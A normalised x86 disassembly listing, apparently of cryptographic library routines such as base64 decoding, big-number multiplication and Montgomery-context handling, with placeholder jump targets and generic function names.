cmp al 0x3d
mov esi 0xf2
jne r-xdata
cmp edi edx
je r-xdata
cmp esi 0xf2
je r-xdata
cmp ecx edx
jle r-xdata
cmp [ ecx + ebp + 0x6 ] 0x3d
jne r-xdata
mov edi 0x1
mov [ esp + 0x10 ] 0x1
mov edi 0x1
xor eax eax
push ecx
mov ecx [ esp + 0x30 ]
lea eax [ ebp + 0x8 ]
push eax
push ecx
call sub_1005a0a0
add esp 0xc
mov [ esp + 0x14 ] 0x0
test eax eax
jl r-xdata
inc edi
jmp r-xdata
mov esi [ esp + 0x18 ]
mov [ ebp + 0x4 ] eax
cmp esi edx
jge r-xdata
cmp edi edx
jne r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx eax
sub edx edi
add ecx edx
xor edx edx
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x14 ]
jmp r-xdata
add [ esp + 0x2c ] eax
cmp eax [ ebp + 0x4 ]
jge r-xdata
sub_1005a0a0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
mov ebp [ esp + 0x20 ]
mov al 0xe0
xor ecx ecx
mov dl [ edi ]
mov [ esp + 0x10 ] ecx
and edx 0x7f
cmp [ edx + rw-data ] al
jne r-xdata
cmp ebp 0x3
jle r-xdata
cmp ebp ecx
jle r-xdata
mov eax ebp
and eax 0x80000003
jns r-xdata
mov al [ edi + ebp - 0x1 ]
and eax 0x7f
mov dl [ eax + rw-data ]
or dl 0x13
cmp dl 0xf3
jne r-xdata
mov dl [ edi + 0x1 ]
inc edi
and edx 0x7f
dec ebp
cmp [ edx + rw-data ] al
je r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
dec ebp
cmp ebp 0x3
jg r-xdata
cmp ebp ecx
mov [ esp + 0x20 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi [ esp + 0x18 ]
test al 0x80
jne r-xdata
mov ebx [ esp + 0x1c ]
test bl 0x80
jne r-xdata
test dl 0x80
jne r-xdata
shl ecx 0x6
or ecx eax
shl ecx 0x6
or ecx ebx
mov ebx [ esp + 0x10 ]
shl ecx 0x6
or ecx edx
add ebx 0x3
mov eax ecx
mov edx ecx
shr eax 0x10
mov [ esi ] al
mov eax [ esp + 0x20 ]
inc esi
add eax 0x4
shr edx 0x8
mov [ esi ] dl
inc esi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x20 ] eax
mov [ esi ] cl
inc esi
cmp eax ebp
jl r-xdata
mov dl [ edi ]
xor ecx ecx
and edx 0x7f
inc edi
xor eax eax
mov cl [ edx + rw-data ]
mov dl [ edi ]
mov bl [ edi + 0x1 ]
and edx 0x7f
inc edi
and ebx 0x7f
mov al [ edx + rw-data ]
xor edx edx
mov dl [ ebx + rw-data ]
mov bl [ edi + 0x1 ]
inc edi
mov [ esp + 0x1c ] edx
and ebx 0x7f
xor edx edx
inc edi
mov dl [ ebx + rw-data ]
test cl 0x80
jne r-xdata
sub_1005a1d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x14 ]
mov [ edi ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esp + 0x10 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
call sub_1005a0a0
add esp 0xc
test eax eax
jge r-xdata
mov [ esi ] 0x0
mov [ edi ] eax
pop edi
or eax 0xffffffff
pop esi
retn
sub_1005a220
mov eax 0x88
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x98 ]
xor eax eax
mov [ esp + 0xc ] eax
mov ebx [ ebp + 0x4 ]
cmp ebx eax
jg r-xdata
push esi
push edi
mov edi [ esp + 0xa4 ]
push edi
call sub_1002dd20
mov esi [ esp + 0xa0 ]
add esp 0x4
cmp ebp esi
jne r-xdata
mov ecx [ esp + 0x94 ]
pop ebp
pop ebx
mov [ ecx + 0x4 ] eax
mov eax 0x1
add esp 0x88
retn
push edi
call sub_1002de70
add esp 0x4
mov edi eax
test esi esi
je r-xdata
push edi
call sub_1002de70
add esp 0x4
mov esi eax
mov esi [ esp + 0x14 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ ebx + ebx ]
cmp eax ecx
mov [ esp + 0x10 ] eax
jg r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
cmp ebx 0x4
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x8
jne r-xdata
mov edx [ ebp ]
mov eax [ esi ]
push edx
push eax
call sub_10054900
add esp 0x8
jmp r-xdata
cmp ebx 0x10
jge r-xdata
mov ecx [ ebp ]
mov edx [ esi ]
push ecx
push edx
call sub_10053fd0
add esp 0x8
jmp r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ ebp ]
mov ebx [ eax + ebx * 4 - 0x4 ]
mov ecx ebx
and ecx 0xffff
cmp ebx ecx
jne r-xdata
push ebx
call sub_10029820
mov ecx eax
add esp 0x4
dec ecx
mov eax 0x1
shl eax cl
cmp ebx eax
lea ecx [ eax + eax ]
jne r-xdata
lea eax [ esp + 0x18 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x10 ]
dec edx
mov [ esi + 0x4 ] edx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ edi + 0x8 ]
cmp eax ecx
jg r-xdata
lea eax [ ecx + ecx ]
mov ecx [ edi + 0x8 ]
cmp eax ecx
jg r-xdata
mov ecx [ ebp ]
mov edx [ esi ]
push eax
push ebx
push ecx
push edx
call sub_1005a3e0
mov esi 0x1
jmp r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
mov eax [ esp + 0x9c ]
cmp esi eax
je r-xdata
push eax
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
push eax
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
mov ecx [ esp + 0xa4 ]
push ecx
call sub_1002de00
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebp ]
mov edx [ esi ]
push eax
push ebx
push ecx
push edx
call sub_1005a4a0
jmp r-xdata
test eax eax
je r-xdata
add esp 0x10
sub_1005a3e0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
lea ecx [ eax + eax ]
lea esi [ eax - 0x1 ]
push edi
mov edi [ esp + 0x1c ]
mov [ ebp + ecx * 4 - 0x4 ] 0x0
test esi esi
mov [ esp + 0x10 ] ecx
mov [ ebp ] 0x0
lea ebx [ ebp + 0x4 ]
jle r-xdata
add eax 0xfffffffe
test eax eax
jle r-xdata
mov eax [ edi ]
add edi 0x4
push eax
push esi
push edi
push ebx
call sub_10053470
add esp 0x10
mov [ ebx + esi * 4 ] eax
mov eax [ esp + 0x20 ]
add ebx 0x8
mov edx [ esp + 0x10 ]
push edx
push ebp
push ebp
push ebp
call sub_100536c0
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x34 ]
push eax
push ecx
push esi
call sub_100535d0
mov edx [ esp + 0x2c ]
push edx
push esi
push ebp
push ebp
call sub_100536c0
add esp 0x2c
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ esp + 0x18 ] eax
mov ecx [ edi ]
add edi 0x4
dec esi
push ecx
push esi
push edi
push ebx
call sub_100532d0
mov [ ebx + esi * 4 ] eax
mov eax [ esp + 0x28 ]
add esp 0x10
add ebx 0x8
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
sub_1005a4a0
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
mov eax ebx
push esi
cdq
sub eax edx
push edi
mov esi eax
sar esi 0x1
cmp ebx 0x4
jne r-xdata
cmp ebx 0x8
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_10054900
add esp 0x8
pop edi
pop esi
pop ebx
pop ecx
retn
cmp ebx 0x10
jge r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_10053fd0
add esp 0x8
pop edi
pop esi
pop ebx
pop ecx
retn
mov edi [ esp + 0x18 ]
push ebp
push esi
lea ebp [ edi + esi * 4 ]
push ebp
push edi
mov [ esp + 0x1c ] ebp
call sub_1002a1c0
add esp 0xc
mov [ esp + 0x20 ] 0x0
test eax eax
jle r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push ecx
push ebx
push edx
push eax
call sub_1005a3e0
add esp 0x10
pop edi
pop esi
pop ebx
pop ecx
retn
jge r-xdata
push esi
push ebp
push edi
mov edi [ esp + 0x30 ]
push edi
call sub_100537d0
add esp 0x10
jmp r-xdata
mov [ esp + 0x20 ] 0x1
mov ecx [ esp + 0x24 ]
push esi
push edi
push ebp
push ecx
call sub_100537d0
add esp 0x10
jmp r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ edi + ebx * 8 ]
test ecx ecx
jne r-xdata
lea ecx [ ebx * 4 ]
xor eax eax
lea ebp [ ecx + edi ]
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x24 ]
push eax
lea ebp [ edi + ebx * 4 ]
push esi
push edi
push ebp
call sub_1005a4a0
add esp 0x10
jmp r-xdata
mov edi [ esp + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
retn
mov edx [ esp + 0x14 ]
add esi ebx
mov ecx edi
lea eax [ edx + esi * 4 ]
mov esi [ edx + esi * 4 ]
add ecx esi
cmp ecx edi
mov [ eax ] ecx
jae r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ edi + ebx * 8 ]
push eax
mov eax [ esp + 0x20 ]
push esi
push eax
push ecx
call sub_1005a4a0
mov edx [ esp + 0x28 ]
lea ecx [ edi + ebx * 8 ]
push ecx
mov ecx [ esp + 0x24 ]
lea eax [ edx + ebx * 4 ]
push esi
push ecx
push eax
mov [ esp + 0x44 ] eax
call sub_1005a4a0
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x38 ]
push ebx
push edx
push eax
push edi
call sub_100536c0
push ebx
push ebp
push edi
push ebp
mov [ esp + 0x64 ] eax
call sub_100537d0
mov edi [ esp + 0x64 ]
mov ecx [ esp + 0x58 ]
add esp 0x40
sub edi eax
lea eax [ ecx + esi * 4 ]
push ebx
push ebp
push eax
push eax
call sub_100536c0
add esp 0x10
add edi eax
pop ebp
je r-xdata
mov ecx [ eax + 0x4 ]
add eax 0x4
inc ecx
mov [ eax ] ecx
je r-xdata
sub_1005a640
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10029990
lea eax [ esi + 0x14 ]
push eax
call sub_10029990
add esp 0x8
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x30 ] eax
pop esi
retn
sub_1005a670
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_10029950
lea eax [ esi + 0x14 ]
push eax
call sub_10029950
mov al [ esi + 0x30 ]
add esp 0x8
test al 0x1
je r-xdata
push esi
call sub_1001d740
add esp 0x4
sub_1005a6a0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push edi
push esi
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x0
push eax
call sub_10029cf0
push edi
call sub_10029870
add esp 0xc
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] 0x0
mov eax 0x1
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_1005a6f0
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push esi
xor ebx ebx
call sub_1002dd20
push esi
call sub_1002de70
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push esi
call sub_1002de00
add esp 0x4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push esi
cmp eax ecx
jne r-xdata
push ecx
push eax
push edi
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
push eax
push edi
call sub_1005a220
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
push esi
push eax
push edi
push ecx
push 0x0
call sub_1005a770
add esp 0x14
mov ebx eax
sub_1005a770
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x0
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov esi eax
push edi
mov [ esp + 0x1c ] esi
call sub_1002de70
mov ebx eax
mov eax [ esp + 0x2c ]
add esp 0xc
mov [ esp + 0x18 ] ebx
test eax eax
jne r-xdata
mov ebp [ esp + 0x24 ]
mov [ esp + 0x20 ] eax
test ebp ebp
jne r-xdata
push edi
call sub_1002de70
add esp 0x4
test esi esi
je r-xdata
push edi
call sub_1002de70
add esp 0x4
mov ebp eax
push edi
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
test ebx ebx
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov esi [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push esi
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
push eax
call sub_10029870
mov edi eax
mov eax [ esi + 0x28 ]
shl eax 0x1
add esp 0x4
cmp eax edi
jle r-xdata
mov ecx [ esp + 0x20 ]
push 0x0
push ecx
call sub_10029cf0
mov edx [ esp + 0x30 ]
push edx
push ebp
call sub_10029bf0
add esp 0x10
test eax eax
jne r-xdata
cmp edi [ esi + 0x2c ]
je r-xdata
mov edi eax
push edi
call sub_1002de00
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp [ esi + 0x2c ] 0xffffffff
je r-xdata
mov ebx [ esp + 0x30 ]
mov [ esp + 0x24 ] 0xffffffff
push ebx
call sub_1002dd20
push ebx
call sub_1002de70
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov edi [ esp + 0x30 ]
mov ecx [ esi + 0x28 ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x10 ]
push ecx
push edx
push eax
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
mov ebx [ esp + 0x24 ]
push edi
push ebx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
lea edx [ esi + 0x14 ]
push ecx
push edx
push eax
push ebx
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
lea edx [ esi + 0x14 ]
push ecx
push esi
push ebx
push 0x0
push edx
call sub_10057d10
add esp 0x14
mov ebx edi
test eax eax
jne r-xdata
sub edi [ esi + 0x28 ]
push edi
mov edi [ esp + 0x24 ]
push ebx
push edi
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push eax
call sub_1002de00
mov [ esi + 0x2c ] ebx
mov ebx [ esp + 0x1c ]
add esp 0x4
mov ecx [ esp + 0x30 ]
mov [ edi + 0xc ] 0x0
push ecx
push edi
push esi
push ebx
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
push ebx
push edx
push ebp
call sub_100387f0
add esp 0xc
test eax eax
je r-xdata
xor ebx ebx
push esi
push ebp
mov [ ebp + 0xc ] ebx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
mov eax ebx
inc ebx
cmp eax 0x2
jg r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
xor eax eax
jmp r-xdata
push 0xc2
push r--data
push 0x65
push 0x82
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
push esi
push ebp
push ebp
call sub_100387f0
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
mov [ ebp + 0xc ] eax
mov ecx [ esi + 0xc ]
mov [ esp + 0x14 ] 0x1
mov eax [ edx + 0xc ]
xor eax ecx
mov [ edi + 0xc ] eax
push 0x1
push edi
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
push esi
push ebp
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
sub_1005aa40
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov [ esi + 0x9c ] 0x0
push esi
call sub_1005b1e0
add esp 0x4
pop esi
retn
push eax
call sub_10029950
add esp 0x4
mov [ esi + 0xa0 ] 0x0
sub_1005aa90
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov [ esi + 0x9c ] 0x0
push esi
call sub_10061a40
add esp 0x4
pop esi
retn
push eax
call sub_100298f0
add esp 0x4
mov [ esi + 0xa0 ] 0x0
sub_1005aae0
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov [ esi + 0x9c ] 0x0
mov edi [ esp + 0x10 ]
push edi
push esi
call sub_10061a70
add esp 0x8
test eax eax
jne r-xdata
push eax
call sub_100298f0
add esp 0x4
mov [ esi + 0xa0 ] 0x0
mov eax [ edi + 0x9c ]
test eax eax
je r-xdata
pop edi
pop esi
retn
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
call sub_1004c330
test eax eax
mov [ esi + 0x9c ] eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
push eax
call sub_10029b30
add esp 0x4
mov [ esi + 0xa0 ] eax
test eax eax
jne r-xdata
mov ecx [ edi + 0x9c ]
push ecx
push eax
call sub_1004c570
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
push eax
call sub_1004c390
add esp 0x4
mov [ esi + 0x9c ] 0x0
sub_1005abb0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
xor ebp ebp
mov eax [ esi + 0x9c ]
mov [ esp + 0xc ] ebp
cmp eax ebp
mov [ esp + 0x10 ] ebp
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax ebp
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov [ esi + 0x9c ] ebp
mov ebx [ esp + 0x28 ]
cmp ebx ebp
jne r-xdata
push eax
call sub_10029950
add esp 0x4
mov [ esi + 0xa0 ] ebp
push edi
call sub_1004c330
mov edi eax
cmp edi ebp
je r-xdata
call sub_1002dc50
cmp eax ebp
mov [ esp + 0xc ] eax
mov ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov eax [ esp + 0x20 ]
push ebx
push eax
push edi
call sub_1004c3d0
add esp 0xc
test eax eax
jne r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
cmp edi ebp
je r-xdata
push eax
call sub_1002dcb0
add esp 0x4
call sub_100299b0
mov ebp eax
test ebp ebp
je r-xdata
push 0xe2
push r--data
push 0x3
push 0xbd
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push edi
call sub_1004c390
add esp 0x4
xor ebp ebp
push ebx
lea ecx [ edi + 0x4 ]
push edi
push ecx
call sub_10029810
push eax
push ebp
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push ebx
push edx
push eax
push ecx
mov [ esi + 0x9c ] edi
push esi
xor edi edi
mov [ esi + 0xa0 ] ebp
call sub_10061ae0
add esp 0x14
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x9c ]
push edx
call sub_1004c390
mov eax [ esi + 0xa0 ]
xor ebx ebx
push eax
mov [ esi + 0x9c ] ebx
call sub_10029950
add esp 0x8
mov [ esi + 0xa0 ] ebx
sub_1005ad10
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x9c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xc ]
push eax
mov eax [ esp + 0x14 ]
push edx
push eax
push ecx
call sub_1004bf30
add esp 0x14
retn
push 0x105
push r--data
push 0x6f
push 0x83
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005ad60
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x9c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push ecx
push eax
mov eax [ esp + 0x14 ]
push eax
push eax
push edx
call sub_1004bf30
add esp 0x14
retn
push 0x111
push r--data
push 0x6f
push 0x84
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005adb0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x9c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push eax
add eax 0x4
push eax
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_1004bf30
add esp 0x14
retn
push 0x11d
push r--data
push 0x6f
push 0x86
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005ae00
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x9c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push eax
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_1004bfb0
add esp 0x10
retn
push 0x129
push r--data
push 0x6f
push 0x85
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005ae50
mov eax [ esp + 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
neg eax
sbb eax eax
neg eax
retn
push 0x135
push r--data
push 0x6f
push 0xd1
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005aed0
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jne r-xdata
push ebx
push esi
call sub_1002dd20
push esi
call sub_1002de70
add esp 0x8
test eax eax
je r-xdata
call sub_1002dc50
mov edi eax
test edi edi
mov esi edi
jne r-xdata
push esi
call sub_1002de00
add esp 0x4
test edi edi
pop ebx
je r-xdata
mov ebx [ esp + 0x18 ]
push ebx
call sub_10064450
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn
pop edi
mov eax ebp
pop esi
pop ebp
retn
push edi
call sub_1002dcb0
add esp 0x4
push ebx
call sub_10064460
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov [ eax + 0xa4 ] sub_100644a0
jmp r-xdata
push ebx
call sub_10064470
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov [ eax + 0xa4 ] sub_10064700
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push esi
push ecx
push edx
push ebx
push eax
call sub_10061ae0
add esp 0x14
mov ebp eax
jmp r-xdata
push ebx
call sub_10064480
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov [ eax + 0xa4 ] sub_10064a00
jmp r-xdata
push ebx
call sub_10064490
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov [ eax + 0xa4 ] sub_10064e60
jmp r-xdata
push 0xad
push r--data
push 0x87
push 0xca
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x14 ]
mov [ eax + 0xa4 ] sub_100653c0
sub_1005b010
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
xor esi esi
xor ebp ebp
test eax eax
push edi
mov [ esp + 0x10 ] esi
je r-xdata
push 0xc3
push r--data
push 0x43
push 0xc8
push 0x10
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov esi [ esp + 0x28 ]
test esi esi
jne r-xdata
mov eax [ esp + 0x20 ]
push esi
push ebx
push eax
push edi
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
call sub_1002dc50
mov esi eax
test esi esi
mov ebp esi
je r-xdata
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
push esi
lea ecx [ eax + 0x48 ]
push ecx
push edi
push edi
call [ eax + 0xa4 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebp
call sub_1002dcb0
add esp 0x4
mov esi 0x1
jmp r-xdata
test ebp ebp
je r-xdata
sub_1005b0e0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor esi esi
xor ebx ebx
test ebp ebp
push edi
mov [ esp + 0x10 ] esi
je r-xdata
push 0xdd
push r--data
push 0x86
push 0xc9
push 0x10
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov esi [ esp + 0x24 ]
test esi esi
jne r-xdata
mov eax [ esp + 0x20 ]
push esi
push eax
push edi
call sub_1005a220
add esp 0xc
test eax eax
je r-xdata
call sub_1002dc50
mov esi eax
test esi esi
mov ebx esi
je r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ ebp + 0x48 ]
push esi
push ecx
push edi
push edi
call [ ebp + 0xa4 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
call sub_1002dcb0
add esp 0x4
mov esi 0x1
jmp r-xdata
test ebx ebx
je r-xdata
sub_1005b1b0
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x48 ]
push eax
call sub_10029990
lea ecx [ esi + 0x70 ]
push ecx
call sub_10029990
add esi 0x84
push esi
call sub_10029990
add esp 0xc
mov eax 0x1
pop esi
retn
sub_1005b1e0
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x48 ]
push eax
call sub_10029950
lea ecx [ esi + 0x70 ]
push ecx
call sub_10029950
add esi 0x84
push esi
call sub_10029950
add esp 0xc
pop esi
retn
sub_1005b210
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x48 ]
push eax
call sub_100298f0
lea ecx [ esi + 0x70 ]
push ecx
call sub_100298f0
lea edx [ esi + 0x84 ]
push edx
call sub_100298f0
add esp 0xc
xor eax eax
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] eax
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x6c ] eax
pop esi
retn
sub_1005b250
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
lea ecx [ esi + 0x48 ]
lea eax [ edi + 0x48 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ edi + 0x70 ]
lea ebx [ esi + 0x70 ]
push edx
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
lea eax [ edi + 0x84 ]
lea ebp [ esi + 0x84 ]
push eax
push ebp
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x60 ]
mov [ esi + 0x60 ] edx
mov eax [ edi + 0x64 ]
mov [ esi + 0x64 ] eax
mov ecx [ edi + 0x68 ]
mov eax [ esi + 0x5c ]
mov [ esi + 0x68 ] ecx
mov edx [ edi + 0x6c ]
add eax 0x1f
mov [ esi + 0x6c ] edx
mov ecx [ esi + 0x78 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jle r-xdata
pop edi
pop esi
